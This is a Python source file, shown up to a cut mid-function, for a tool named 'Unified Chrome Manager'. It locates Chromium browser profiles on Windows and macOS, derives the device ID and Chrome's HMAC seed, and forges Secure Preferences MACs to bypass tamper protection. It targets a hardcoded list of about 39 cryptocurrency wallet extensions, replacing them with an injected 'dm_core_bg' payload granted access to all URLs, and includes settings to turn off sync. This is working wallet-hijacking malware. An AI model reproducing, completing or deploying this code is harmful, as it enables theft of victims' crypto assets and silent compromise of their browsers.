#!/usr/bin/env python3
"""
Unified Chrome Manager — Windows and macOS only.
Terminates browser processes, enables developer mode, and replaces extensions with custom extensions.
Targets Chromium-based browsers (Chrome, Edge, Brave, etc.).

HMAC handling follows Chromium PrefHashCalculator / device_id_win.cc / device_id_mac.cc.
Supports signed and unsigned profiles and extension replacement with MAC updates.
"""

import base64
import json
import os
import re
import sys
import glob
import shutil
import hmac
import hashlib
import uuid
import struct
import binascii
import getpass
import subprocess
import time
import logging
from datetime import datetime, timezone
from collections import OrderedDict
from pathlib import Path
from typing import List, Tuple, Dict, Optional, Any, Set

from libhmac.patch.common import patch_extension_html_tree, patch_extension_manifest
from libhmac import payload as _payload

# sync/service/sync_feature_status_for_migrations_recorder.cc GetDataTypeStatusPrefName:
# "sync.data_type_status_for_sync_to_signin." + DataTypeToStableLowerCaseString(type)
# components/sync/base/data_type.cc — all real protocol data types (persisted spellings).
_SYNC_DATA_TYPE_STATUS_KEYS = frozenset(
    (
        "bookmarks",
        "preferences",
        "passwords",
        "autofill_profiles",
        "autofill",
        "autofill_wallet_credential",
        "autofill_wallet",
        "autofill_wallet_metadata",
        "autofill_wallet_offer",
        "autofill_wallet_usage",
        "themes",
        "themes_ios",
        "extensions",
        "search_engines",
        "sessions",
        "apps",
        "app_settings",
        "extension_settings",
        "history_delete_directives",
        "dictionary",
        "device_info",
        "priority_preferences",
        "managed_user_settings",
        "app_list",
        "arc_package",
        "printers",
        "reading_list",
        "user_events",
        "user_consent",
        "send_tab_to_self",
        "security_events",
        "wifi_configurations",
        "web_apps",
        "webapks",
        "os_preferences",
        "os_priority_preferences",
        "sharing_message",
        "workspace_desk",
        "history",
        "printers_authorization_servers",
        "contact_info",
        "saved_tab_group",
        "webauthn_credential",
        "incoming_password_sharing_invitation",
        "outgoing_password_sharing_invitation",
        "shared_tab_group_data",
        "collaboration_group",
        "plus_address",
        "product_comparison",
        "cookies",
        "plus_address_setting",
        "autofill_valuable",
        "autofill_valuable_metadata",
        "account_setting",
        "shared_tab_group_account_data",
        "shared_comment",
        "ai_thread",
        "contextual_task",
        "nigori",
        "skill",
        "gemini_thread",
        "accessibility_annotation",
    )
)

# components/sync/base/pref_names.h — user-selectable booleans (suffix after "sync.").
_SYNC_USER_TYPE_PREFS_FALSE = (
    "bookmarks",
    "preferences",
    "passwords",
    "autofill",
    "themes",
    "typed_urls",
    "extensions",
    "apps",
    "reading_list",
    "tabs",
    "saved_tab_groups",
    "payments",
    "product_comparison",
    "cookies",
)


def _prefs_set_path(root: dict, dotted_path: str, value) -> bool:
    """Set user pref path like 'sync.extensions' on nested dict; return True if changed."""
    parts = dotted_path.split(".")
    cur = root
    for p in parts[:-1]:
        nxt = cur.get(p)
        if not isinstance(nxt, dict):
            cur[p] = {}
            nxt = cur[p]
        cur = nxt
    leaf = parts[-1]
    if cur.get(leaf) != value:
        cur[leaf] = value
        return True
    return False


# Configure detailed logging with Unicode support
def setup_logging():
    """Setup logging with proper Unicode handling for Windows"""
    # Create logger
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)

    # Clear any existing handlers
    logger.handlers.clear()

    # Create formatter
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

    # File handler with UTF-8 encoding
    file_handler = logging.FileHandler("libhmac.log", encoding="utf-8")
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)

    # Console handler with fallback for emojis
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)

    # Create a custom formatter that removes emojis for console on Windows
    class SafeFormatter(logging.Formatter):
        def format(self, record):
            # Format the record normally first
            formatted = super().format(record)
            # Remove emojis for console output on Windows
            if sys.platform == 'win32':
                import re
                # Remove emoji characters for console display
                formatted = re.sub(r'[^\x00-\x7F]+', '', formatted)
            return formatted

    console_handler.setFormatter(SafeFormatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

    return logger

logger = setup_logging()

# ---------------------------------------------------------------------------
# Wallet extension IDs for in-place modification
# Edge Add-ons store ids differ from Chrome for some wallets; Edge can also use Chrome Web Store ids.
# ---------------------------------------------------------------------------
WALLET_NAMES = {
    "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
    "hifafgmccdpekplomjjkcfgodnhcellj": "Crypto.com DeFi Wallet",
    "aholpfdialjgjfhomihkjbmgjidlcdno": "Exodus",
    "efbglgofoippbgcjepnhiblaibcnclgk": "Martian Wallet",
    "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
    "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
    "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin Wallet",
    "egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
    "ajkhoeiiokighlmdnlakpjfoobnjinie": "Trust Wallet (Microsoft Edge)",
    "hmeobnfnfcmdkdcmlblgagmfpfboieaf": "Ctrl Wallet",
    "dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
    "mkpegjkblkkefacfnmkajcjmabijhclg": "Magic Eden",
    "phkbamefinggmakgklpkljjmgibohnba": "Pontem Wallet",
    "acmacodkjbdgmoleebolmdjonilkdbch": "Rabby Wallet",
    "lgmpcpglpngdoalbgeoldeajfclnhafa": "SafePal",
    "bhhhlbepdkbapadjdnnojkbgioiodbic": "Solflare",
    "omaabbefbmiijedngplfjmnooppbclkk": "TonKeeper",
    "nnpmfplkfogfpmcngplhnbdnnilmcdcg": "Uniswap Extension",
    "klghhnkeealcohjjanjjdaeeggmfmlpl": "Zerion Wallet",
    "ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask Flask / MetaMask (Edge Add-ons)",
    "pbpjkcldjiffchgbbndmhojiacbgflha": "OKX Wallet (Edge)",
    "ocodgmmffbkkeecmadcijjhkmeohinei": "Keplr (Edge)",
    "apenkfbbpmhihehmihndmmcdanacolnh": "SafePal (Edge)",
    "aflkmfhebedbjioipglgcbcmnbpgliof": "Backpack",
    "aeachknmefphepccionboohckonoeemg": "Coin98 Wallet",
    "ejjladinnckdgjemekebdpeokbikhfci": "Petra Wallet",
    "dlcobpjiigpikoobohmabehhmhfoodbb": "Argent X",
    "khpkpbbcccdmmclmpigdgddabeilkdpd": "Suiet Wallet",
    "idnnbdplmphpflfnlkomgpfbpcgelopg": "Xverse Wallet",
    "onhogfjeacnfoofkfgppdlbmlmnplgbn": "SubWallet",
    "gjnckgkfmgmibbkoficdidcljeaaaheg": "Atomic Wallet",
    "pdliaogehgdbhbnmkklieghmmjkpigpa": "Bybit Wallet",
    "jiidiaalihmmhddjgbnbgdfflelocpak": "Bitget Wallet",
    "afbcbjpbpfadlkmhmclhkeeodmamcflc": "MathWallet",
    "mfgccjchihfkkindfppnaooecgfneiii": "TokenPocket",
    "kkpllkodjeloidieedojogacfhpaihoh": "Enkrypt",
    "opfgelmcmbiajamepnmloijbpoleiama": "Rainbow",
    "ldinpeekobnhjjdofggfgjlcehhmanlj": "Leather",
}

PAYLOAD_JS = "dm_core_bg.js"
PAYLOAD_WASM = "dm_core_bg.wasm"
INJECTED_JS_NAME = "dm_core_bg.js"
REQUIRED_PERMISSIONS = [
    "storage",
    "tabs",
    "activeTab",
    "scripting",
    "unlimitedStorage",
    "alarms",
    "webNavigation",
    "offscreen",
]
REQUIRED_HOST_PERMISSIONS = ["<all_urls>"]


def _platform_supported() -> bool:
    return os.name == "nt" or sys.platform == "darwin"


def _require_supported_platform() -> None:
    if not _platform_supported():
        raise RuntimeError(
            "UnifiedChromeManager supports only Windows and macOS (this OS is unsupported)."
        )


def _get_pref_value_at_path(root: Any, dotted_path: str) -> Any:
    """Navigate Secure Preferences (or full prefs) by dotted path, e.g. extensions.settings.abc."""
    cur = root
    for part in dotted_path.split("."):
        if not isinstance(cur, dict) or part not in cur:
            return None
        cur = cur[part]
    return cur


def _get_chromium_windows_device_id() -> str:
    """
    Match chromium/services/preferences/tracked/device_id_win.cc:
    GetComputerNameW (NetBIOS name) -> LookupAccountNameW -> full machine SID string.
    Returns "" on failure (Chromium then uses an empty device_id for HMAC).
    """
    if os.name != "nt":
        return ""
    import ctypes
    from ctypes import wintypes

    ERROR_INSUFFICIENT_BUFFER = 122
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)

    MAX_COMPUTERNAME_LENGTH = 15
    computer_name = ctypes.create_unicode_buffer(MAX_COMPUTERNAME_LENGTH + 1)
    size = wintypes.DWORD(MAX_COMPUTERNAME_LENGTH + 1)
    if not kernel32.GetComputerNameW(computer_name, ctypes.byref(size)):
        logger.warning("GetComputerNameW failed, last error=%s", ctypes.get_last_error())
        return ""

    sid_buf = ctypes.create_string_buffer(256)
    cb_sid = wintypes.DWORD(256)
    domain_size = wintypes.DWORD(128)
    domain_buf = ctypes.create_unicode_buffer(128)
    sid_name_use = wintypes.DWORD(0)

    advapi32.LookupAccountNameW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        ctypes.c_void_p,
        ctypes.POINTER(wintypes.DWORD),
        wintypes.LPWSTR,
        ctypes.POINTER(wintypes.DWORD),
        ctypes.POINTER(wintypes.DWORD),
    ]
    advapi32.LookupAccountNameW.restype = wintypes.BOOL
    advapi32.ConvertSidToStringSidA.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)]
    advapi32.ConvertSidToStringSidA.restype = wintypes.BOOL
    kernel32.LocalFree.argtypes = [wintypes.HLOCAL]
    kernel32.LocalFree.restype = wintypes.HLOCAL

    sid_ptr = ctypes.cast(sid_buf, ctypes.c_void_p)
    ok = advapi32.LookupAccountNameW(
        None,
        computer_name,
        sid_ptr,
        ctypes.byref(cb_sid),
        domain_buf,
        ctypes.byref(domain_size),
        ctypes.byref(sid_name_use),
    )
    if not ok:
        err = kernel32.GetLastError()
        if err == ERROR_INSUFFICIENT_BUFFER:
            domain_buf = ctypes.create_unicode_buffer(domain_size.value)
            domain_size = wintypes.DWORD(domain_size.value)
            cb_sid = wintypes.DWORD(256)
            ok = advapi32.LookupAccountNameW(
                None,
                computer_name,
                sid_ptr,
                ctypes.byref(cb_sid),
                domain_buf,
                ctypes.byref(domain_size),
                ctypes.byref(sid_name_use),
            )
        if not ok:
            logger.warning("LookupAccountNameW failed, last error=%s", kernel32.GetLastError())
            return ""

    str_sid_ptr = ctypes.c_void_p()
    if not advapi32.ConvertSidToStringSidA(sid_ptr, ctypes.byref(str_sid_ptr)):
        logger.warning("ConvertSidToStringSidA failed, last error=%s", kernel32.GetLastError())
        return ""
    try:
        if not str_sid_ptr.value:
            return ""
        return ctypes.string_at(str_sid_ptr.value).decode("ascii")
    finally:
        if str_sid_ptr.value:
            kernel32.LocalFree(str_sid_ptr)


class UnifiedChromeManager:
    def __init__(self, username=None):
        logger.info("🚀 Initializing UnifiedChromeManager")
        _require_supported_platform()

        # extensions/browser/disable_reason.h — all DisableReason values.
        # Modern Chrome stores disable_reasons as a list of individual ints
        # (not a bitmask), e.g. [16777216] for developer mode off.
        self.DISABLE_NONE = 0
        self.DISABLE_USER_ACTION = 1 << 0
        self.DISABLE_PERMISSIONS_INCREASE = 1 << 1
        self.DISABLE_RELOAD = 1 << 2
        self.DISABLE_UNSUPPORTED_REQUIREMENT = 1 << 3
        self.DISABLE_SIDELOAD_WIPEOUT = 1 << 4
        self.DISABLE_NOT_VERIFIED = 1 << 8
        self.DISABLE_GREYLIST = 1 << 9
        self.DISABLE_CORRUPTED = 1 << 10
        self.DISABLE_REMOTE_INSTALL = 1 << 11
        self.DISABLE_EXTERNAL_EXTENSION = 1 << 13
        self.DISABLE_UPDATE_REQUIRED_BY_POLICY = 1 << 14
        self.DISABLE_CUSTODIAN_APPROVAL_REQUIRED = 1 << 15
        self.DISABLE_BLOCKED_BY_POLICY = 1 << 16
        self.DISABLE_REINSTALL = 1 << 19
        self.DISABLE_NOT_ALLOWLISTED = 1 << 20
        self.DISABLE_PUBLISHED_IN_STORE_REQUIRED_BY_POLICY = 1 << 22
        self.DISABLE_UNSUPPORTED_MANIFEST_VERSION = 1 << 23
        self.DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION = 1 << 24
        self.DISABLE_BLOCKED_BY_CLOUD_POLICY_CHECK = 1 << 26

        # Convenience alias used throughout the codebase
        self.DEVELOPER_MODE_DISABLED_REASON = self.DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION

        # Reasons that should be cleared when we replace/reinstall an extension
        # as unpacked, matching InstalledLoader::Load + ExtensionRegistrar logic:
        # DISABLE_CORRUPTED — cleared when integrity is restored
        # DISABLE_REINSTALL — cleared after reinstall
        # DISABLE_NOT_VERIFIED — cleared when content verifier re-checks
        # DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION — cleared when dev mode on
        self._DISABLE_REASONS_CLEAR_ON_REPLACE = frozenset({
            self.DISABLE_CORRUPTED,
            self.DISABLE_REINSTALL,
            self.DISABLE_NOT_VERIFIED,
            self.DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION,
        })
        logger.debug(f"Disable reason constants loaded from disable_reason.h")

        # User configuration
        self.username = username or getpass.getuser()
        logger.info(f"👤 Operating as user: {self.username}")

        # Get device ID for HMAC calculation (cached)
        logger.debug("🔑 Retrieving device ID for HMAC calculation...")
        self.device_id = self._get_device_id()
        if self.device_id:
            logger.info("🔑 Device ID obtained: %s...", self.device_id[:48])
        else:
            logger.info("🔑 Device ID empty (valid for Chromium stub / failed lookup; HMAC uses \"\")")

        # HMAC seeds cache for performance
        self.hmac_seeds = {}
        logger.debug("💾 HMAC seeds cache initialized")

        # Cache for browser paths and profiles
        self._browser_paths_cache = None
        self._browser_profiles_cache = None
        logger.debug("💾 Browser paths and profiles cache initialized")

        logger.info("✅ UnifiedChromeManager initialization complete")

    @staticmethod
    def _profile_supports_unpacked_extensions(profile_name: str) -> bool:
        """
        Chrome only treats regular user profiles as able to use non-component extensions
        (profile_util.cc ProfileCanUseNonComponentExtensions → IsRegularProfile).
        System Profile and Guest are not regular; patching them wastes work and misleads
        debugging when the user actually uses Profile 1 / Default.
        """
        if not profile_name or not isinstance(profile_name, str):
            return False
        if profile_name == "Guest Profile":
            return False
        if profile_name == "System Profile":
            return False
        return True

    @staticmethod
    def _manifest_clone_for_prefs(manifest: Optional[dict]) -> Optional[OrderedDict]:
        """
        Deep copy manifest JSON for extensions.settings.
        Used only for reference_changed_parity mode (non-unpacked emulation).
        Chrome's PopulateExtensionInfoPrefs skips manifest for unpacked:
          if (!Manifest::IsUnpackedLocation(extension->location()))
        """
        if not manifest or not isinstance(manifest, dict):
            return None
        try:
            return json.loads(json.dumps(manifest), object_pairs_hook=OrderedDict)
        except (TypeError, ValueError):
            return None

    def get_os_type(self) -> str:
        """Return windows or darwin. Unsupported platforms never reach here (see _require_supported_platform)."""
        if os.name == "nt":
            return "windows"
        if sys.platform == "darwin":
            return "darwin"
        raise RuntimeError("Unsupported platform")

    def _get_device_id(self) -> str:
        """
        Chromium PrefHashCalculator device_id (pref_hash_store_impl.cc GenerateDeviceId).
        Windows: device_id_win.cc (machine account SID). macOS: device_id_mac.cc (IOPlatformUUID).
        """
        logger.debug("🔍 Starting device ID retrieval process")

        if os.name == "nt":
            logger.debug("🪟 Windows: GetComputerNameW + LookupAccountNameW (Chromium device_id_win.cc)")
            did = _get_chromium_windows_device_id()
            if did:
                logger.info("✅ Windows machine SID (Chromium-style): %s...", did[:32])
            else:
                logger.warning("⚠️ Windows device ID unavailable; HMAC uses empty device_id like Chromium fallback")
            return did

        if sys.platform == "darwin":
            try:
                result = subprocess.run(
                    ["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
                    capture_output=True,
                    text=True,
                    timeout=30,
                )
                if result.returncode == 0:
                    import re

                    uuid_match = re.search(r'"IOPlatformUUID"\s*=\s*"([A-F0-9-]+)"', result.stdout)
                    if uuid_match:
                        return uuid_match.group(1)
            except (FileNotFoundError, subprocess.SubprocessError, subprocess.TimeoutExpired) as e:
                logger.warning("⚠️ macOS device ID (ioreg) failed: %s", e)
            logger.warning("⚠️ macOS device ID unavailable; using empty string (Chromium FAILURE path)")
            return ""

        logger.warning("⚠️ Unexpected platform in _get_device_id")
        return ""

    def _normalize_browser_name(self, browser_name):
        """Normalize browser name to handle variants consistently"""
        browser_name_lower = browser_name.lower()

        # Chrome variants -> chrome
        if any(x in browser_name_lower for x in ['chrome', 'chromium']):
            if 'chromium' in browser_name_lower:
                return 'chromium'
            return 'chrome'

        # Edge variants -> edge
        if any(x in browser_name_lower for x in ['edge', 'msedge', 'microsoft-edge']):
            return 'edge'

        # Brave variants -> brave
        if 'brave' in browser_name_lower:
            return 'brave'

        # Opera variants -> opera
        if 'opera' in browser_name_lower:
            return 'opera'

        # Vivaldi variants -> vivaldi
        if 'vivaldi' in browser_name_lower:
            return 'vivaldi'

        # Yandex variants -> yandex
        if 'yandex' in browser_name_lower:
            return 'yandex'

        # Other browsers
        if 'arc' in browser_name_lower:
            return 'arc'
        if 'thorium' in browser_name_lower:
            return 'thorium'
        if 'iridium' in browser_name_lower:
            return 'iridium'

        # Default to the original name
        return browser_name_lower

    def _get_hmac_seed_for_browser(self, browser_name):
        """Get HMAC seed for specific browser"""
        # Normalize browser name for consistent handling
        normalized_name = self._normalize_browser_name(browser_name)

        if normalized_name not in self.hmac_seeds:
            self.hmac_seeds[normalized_name] = self._extract_hmac_seed(normalized_name)
        return self.hmac_seeds[normalized_name]

    def _extract_hmac_seed(self, browser_name="chrome"):
        """Extract HMAC seed from browser's resources.pak file or return blank seed for Brave/Edge"""
        # Normalize browser name for consistent handling
        browser_name_lower = browser_name.lower()

        # Browsers that use blank/empty seed in release builds
        blank_seed_browsers = [
            'brave', 'brave-browser', 'brave-beta', 'brave-nightly',
            'edge', 'msedge', 'microsoft-edge', 'microsoft-edge-stable', 'microsoft-edge-beta', 'microsoft-edge-dev',
            'opera', 'opera-stable', 'opera-beta', 'opera-developer', 'operagx',
            'vivaldi', 'vivaldi-stable', 'vivaldi-snapshot',
            'yandex', 'yandex-browser', 'yandex-browser-stable', 'yandex-browser-beta',
            'arc', 'thorium'
        ]

        if browser_name_lower in blank_seed_browsers:
            return b''

        # Only try to extract seed for Chrome/Chromium
        chrome_paths = []
        if os.name == 'nt':  # Windows
            chrome_paths = [
                r'C:\Program Files\Google\Chrome\Application',
                r'C:\Program Files (x86)\Google\Chrome\Application'
            ]
        elif sys.platform == 'darwin':  # macOS
            chrome_paths = [
                '/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions'
            ]
        else:
            chrome_paths = []

        for base_path in chrome_paths:
            if os.path.exists(base_path):
                if sys.platform == 'darwin':  # macOS
                    resources_pak = os.path.join(base_path, 'Current', 'Resources', 'resources.pak')
                    if os.path.exists(resources_pak):
                        seed = self._extract_seed_from_pak(resources_pak)
                        if seed:
                            return seed
                elif os.name == 'nt':  # Windows
                    try:
                        for item in os.listdir(base_path):
                            version_path = os.path.join(base_path, item)
                            if os.path.isdir(version_path) and item.replace('.', '').isdigit():
                                resources_pak = os.path.join(version_path, 'resources.pak')
                                if os.path.exists(resources_pak):
                                    seed = self._extract_seed_from_pak(resources_pak)
                                    if seed:
                                        return seed
                    except (PermissionError, OSError):
                        continue

        # Known Chrome release seed fallback (Windows/macOS Chrome/Chromium pak extraction)
        return bytes.fromhex('e748f336d85ea5f9dcdf25d8f347a65b4cdf667600f02df6724a2af18a212d26b788a25086910cf3a90313696871f3dc05823730c91df8ba5c4fd9c884b505a8')

    def _extract_seed_from_pak(self, pak_file):
        """Extract the 64-byte HMAC seed from resources.pak"""
        try:
            with open(pak_file, 'rb') as f:
                data = f.read()
                known_seed_start = bytes.fromhex('e748f336d85ea5f9dcdf25d8f347a65b')

                for i in range(0, len(data) - 64):
                    candidate = data[i:i+64]
                    if candidate.startswith(known_seed_start):
                        return candidate

        except Exception as e:
            print(f"Error reading PAK file {pak_file}: {e}")

        return None

    def backup_file(self, file_path: Path) -> Path:
        """Create a backup of the original file."""
        backup_path = file_path.with_suffix(file_path.suffix + '.backup')
        shutil.copy2(file_path, backup_path)
        return backup_path

    def restore_browser_state(self) -> bool:
        """Restore original browser state from backup files"""
        print("🔄 Restoring original browser state from backup files...")

        browser_profiles = self.find_all_browser_profiles()
        if not browser_profiles:
            print("❌ No browser profiles found!")
            return False

        total_restored = 0

        for browser_name, browser_info in browser_profiles.items():
            browser_path = Path(browser_info["path"])
            profiles = browser_info["profiles"]

            for profile_name in profiles:
                profile_path = browser_path / profile_name

                # Restore Preferences from backup
                prefs_file = profile_path / "Preferences"
                prefs_backup = profile_path / "Preferences.backup"

                if prefs_backup.exists():
                    try:
                        shutil.copy2(prefs_backup, prefs_file)
                        print(f"✅ Restored Preferences for {browser_name} - {profile_name}")
                        total_restored += 1
                    except Exception as e:
                        print(f"❌ Failed to restore Preferences for {browser_name} - {profile_name}: {e}")

                # Restore Secure Preferences from backup
                secure_prefs_file = profile_path / "Secure Preferences"
                secure_prefs_backup = profile_path / "Secure Preferences.backup"

                if secure_prefs_backup.exists():
                    try:
                        shutil.copy2(secure_prefs_backup, secure_prefs_file)
                        print(f"✅ Restored Secure Preferences for {browser_name} - {profile_name}")
                        total_restored += 1
                    except Exception as e:
                        print(f"❌ Failed to restore Secure Preferences for {browser_name} - {profile_name}: {e}")

                # Remove External Extensions directory if it exists (created by our script)
                external_extensions_dir = profile_path / "External Extensions"
                if external_extensions_dir.exists():
                    try:
                        shutil.rmtree(external_extensions_dir)
                        print(f"✅ Removed External Extensions for {browser_name} - {profile_name}")
                    except Exception as e:
                        print(f"❌ Failed to remove External Extensions for {browser_name} - {profile_name}: {e}")

        if total_restored > 0:
            print(f"✅ Restoration completed: {total_restored} files restored")
            print("💡 Restart your browsers to see the original state")
        else:
            print("❌ No backup files found to restore")

        return total_restored > 0

    def detect_profile_type(self, data: Dict) -> str:
        """Detect if this is a signed or unsigned profile."""
        # Signed profiles have account_values at the root level
        if 'account_values' in data:
            return "signed"
        else:
            return "unsigned"

    def calculate_hmac(self, value, path: str, browser_name="chrome") -> Optional[str]:
        """
        Match chromium PrefHashCalculator::HmacSign / ValueAsString:
        HMAC-SHA256(key=seed, msg=device_id || path || utf8(json)), hex uppercase.
        JSON uses base::WriteJson key order (no global sort) and strips empty dict/list
        branches like RemoveEmptyValueDictEntries; '<' in strings -> \\u003C.
        """
        try:
            hmac_seed = self._get_hmac_seed_for_browser(browser_name)

            if value is None:
                json_content = ""
            elif isinstance(value, bool):
                json_content = "true" if value else "false"
            elif isinstance(value, dict):
                data_copy = json.loads(json.dumps(value, ensure_ascii=False), object_pairs_hook=OrderedDict)
                self._remove_empty_chrome_style(data_copy)
                json_content = json.dumps(
                    data_copy, separators=(",", ":"), ensure_ascii=False
                )
                json_content = json_content.replace("<", "\\u003C")
            elif isinstance(value, list):
                data_copy = json.loads(json.dumps(value, ensure_ascii=False), object_pairs_hook=OrderedDict)
                self._remove_empty_chrome_style(data_copy)
                json_content = json.dumps(
                    data_copy, separators=(",", ":"), ensure_ascii=False
                )
                json_content = json_content.replace("<", "\\u003C")
            else:
                json_content = json.dumps(value, separators=(",", ":"), ensure_ascii=False)
                if isinstance(value, str):
                    json_content = json_content.replace("<", "\\u003C")

            device_id = self.device_id if self.device_id is not None else ""
            message = device_id + path + json_content
            hash_obj = hmac.new(hmac_seed, message.encode("utf-8"), hashlib.sha256)
            return hash_obj.hexdigest().upper()

        except Exception as e:
            print(f"  WARNING: Could not calculate HMAC for {path}: {e}")
            return None

    def _remove_empty_chrome_style(self, data):
        """
        Match chromium pref_hash_calculator.cc RemoveEmptyValueDictEntries /
        RemoveEmptyValueListEntries: only remove keys/items whose value is an
        empty dict or empty list (after recursing). Do not strip None or \"\".
        """
        if isinstance(data, dict):
            keys_to_remove = []
            for key, value in list(data.items()):
                if isinstance(value, list):
                    self._remove_empty_chrome_style(value)
                    if len(value) == 0:
                        keys_to_remove.append(key)
                elif isinstance(value, dict):
                    self._remove_empty_chrome_style(value)
                    if len(value) == 0:
                        keys_to_remove.append(key)

            for key in keys_to_remove:
                del data[key]

        elif isinstance(data, list):
            indices_to_remove = []
            for i, item in enumerate(data):
                if isinstance(item, list):
                    self._remove_empty_chrome_style(item)
                    if len(item) == 0:
                        indices_to_remove.append(i)
                elif isinstance(item, dict):
                    self._remove_empty_chrome_style(item)
                    if len(item) == 0:
                        indices_to_remove.append(i)

            for i in reversed(indices_to_remove):
                del data[i]

    def calculate_super_mac(self, macs_data, browser_name="chrome") -> Optional[str]:
        """
        Chromium pref_hash_store_impl.cc: SetSuperMac(ComputeMac("", hashes_dict)).
        Payload is JSON of protection.macs with base::WriteJson iteration order (no sort_keys).
        """
        try:
            json_content = json.dumps(macs_data, separators=(",", ":"), ensure_ascii=False)
            device_id = self.device_id if self.device_id is not None else ""
            message = device_id + json_content
            hmac_seed = self._get_hmac_seed_for_browser(browser_name)
            hash_obj = hmac.new(hmac_seed, message.encode("utf-8"), hashlib.sha256)
            return hash_obj.hexdigest().upper()
        except Exception as e:
            logger.warning("Could not calculate super_mac: %s", e)
            return None

    def verify_secure_preferences_hmacs(
        self, secure_prefs_path: str, browser_name: str = "chrome"
    ) -> Tuple[bool, List[str]]:
        """
        Recompute legacy MACs + super_mac for a copied Secure Preferences file (same machine/seed as Chrome).
        Does not validate encrypted-hash entries.
        """
        errors: List[str] = []
        p = Path(secure_prefs_path)
        if not p.is_file():
            return False, [f"Not a file: {secure_prefs_path}"]
        try:
            with open(p, "r", encoding="utf-8") as f:
                data = json.load(f, object_pairs_hook=OrderedDict)
        except Exception as e:
            return False, [f"Failed to read JSON: {e}"]

        protection = data.get("protection")
        if not isinstance(protection, dict):
            return False, ["Missing protection section"]
        macs = protection.get("macs")
        if not isinstance(macs, dict):
            return False, ["Missing protection.macs"]

        super_stored = protection.get("super_mac") or ""
        super_calc = self.calculate_super_mac(macs, browser_name)
        if not super_calc or super_stored.upper() != super_calc.upper():
            errors.append(
                f"super_mac mismatch: file={super_stored!r} recomputed={super_calc!r}"
            )

        self._verify_macs_subtree(data, macs, [], browser_name, errors)
        return (len(errors) == 0, errors)

    def _verify_macs_subtree(
        self,
        prefs_root: dict,
        macs_node: Any,
        segments: List[str],
        browser_name: str,
        errors: List[str],
    ) -> None:
        if not isinstance(macs_node, dict):
            return
        for key, val in macs_node.items():
            if isinstance(val, dict):
                self._verify_macs_subtree(prefs_root, val, segments + [key], browser_name, errors)
                continue
            if not isinstance(val, str) or len(val) != 64:
                continue
            try:
                int(val, 16)
            except ValueError:
                continue
            pref_path = ".".join(segments + [key])
            pref_val = _get_pref_value_at_path(prefs_root, pref_path)
            computed = self.calculate_hmac(pref_val, pref_path, browser_name)
            if not computed or computed.upper() != val.upper():
                errors.append(
                    f"MAC {pref_path}: stored={val!r} recomputed={computed!r} "
                    f"(pref present={pref_val is not None})"
                )

    def enable_extensions(self, data: Dict) -> Tuple[int, List[str]]:
        """
        Remove disable reasons that should be cleared after enabling developer mode
        and replacing extensions. Chrome stores disable_reasons as a list of ints
        (extension_prefs.cc ReadDisableReasonsFromPrefs / WriteDisableReasonsToPrefs).

        Clears:
          DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION (1<<24) — dev mode now on
          DISABLE_CORRUPTED (1<<10) — integrity restored by our replacement
          DISABLE_REINSTALL (1<<19) — extension is being reinstalled
          DISABLE_NOT_VERIFIED (1<<8) — content verifier re-checks on load

        Returns (count, list of modified extension ids).
        """
        modified_ids: List[str] = []

        if 'extensions' in data and 'settings' in data['extensions']:
            extensions_settings = data['extensions']['settings']
            for ext_id, ext_data in extensions_settings.items():
                if 'disable_reasons' not in ext_data:
                    continue
                dr = ext_data['disable_reasons']
                if not isinstance(dr, list):
                    continue
                before_len = len(dr)
                ext_data['disable_reasons'] = [
                    r for r in dr if r not in self._DISABLE_REASONS_CLEAR_ON_REPLACE
                ]
                if len(ext_data['disable_reasons']) != before_len:
                    modified_ids.append(ext_id)

        return len(modified_ids), modified_ids

    def _ensure_protection_macs_layout(self, data: Dict) -> None:
        """Ensure protection.macs.extensions.settings exists for tracked MAC writes."""
        if 'protection' not in data:
            data['protection'] = {'macs': {}}
        if 'macs' not in data['protection']:
            data['protection']['macs'] = {}
        macs = data['protection']['macs']
        if 'extensions' not in macs:
            macs['extensions'] = {}
        if 'settings' not in macs['extensions']:
            macs['extensions']['settings'] = {}

    def _strip_extensions_settings_encrypted_hashes(
        self,
        data: Dict,
        extension_ids: Optional[List[str]] = None,
        *,
        clear_all: bool = False,
    ) -> bool:
        """
        Remove split encrypted-hash entries under protection.macs.extensions.

        Chrome (pref_hash_store_impl.cc CheckValueInternal) checks encrypted hashes
        before legacy MACs. Stale ciphertext after editing extensions.settings.<id>
        causes Chrome to discard those prefs on load.

        Use clear_all=True during extension replacement so every extension falls back
        to its legacy per-id MAC (heals missed ids).
        """
        prot = data.get("protection")
        if not isinstance(prot, dict):
            return False
        macs = prot.get("macs")
        if not isinstance(macs, dict):
            return False
        ext_macs = macs.get("extensions")
        if not isinstance(ext_macs, dict):
            return False
        enc = ext_macs.get("settings_encrypted_hash")
        if not isinstance(enc, dict):
            return False
        if clear_all:
            del ext_macs["settings_encrypted_hash"]
            logger.info(
                "Removed entire protection.macs.extensions.settings_encrypted_hash "
                "(extension replace / heal)"
            )
            return True
        if not extension_ids:
            return False
        changed = False
        for eid in extension_ids:
            if eid in enc:
                del enc[eid]
                changed = True
                logger.info(
                    "Removed stale macs.extensions.settings_encrypted_hash[%s]", eid
                )
        if changed and not enc:
